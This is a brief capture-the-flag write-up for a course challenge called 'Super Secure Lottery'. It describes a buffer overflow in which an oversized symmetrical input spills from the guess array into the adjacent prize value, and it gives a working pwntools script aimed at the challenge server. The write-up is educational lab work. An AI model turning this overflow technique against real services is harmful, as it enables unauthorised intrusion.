# Challenge `Super Secure Lottery` writeup

- Vulnerability:
  - Buffer Overflow
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port `23161`
- Impact:
  - Allows attacker to guess the lottery

## Steps to reproduce

1. The `guess` and `prize` values are stored consecutively
2. We can overflow the `guess` array by providing a large enough input
3. If this input is symmetrical, `prize` will be equal to `guess`

The code used was:

```py
from pwn import *

session = remote("mustard.stt.rnl.tecnico.ulisboa.pt", "23161", timeout=1000)

guess_address = 0xffffd014
prize_address = 0xffffd044

session.send(b'1'* (prize_address - guess_address) * 2)
print(session.recvuntil(b'}'))
```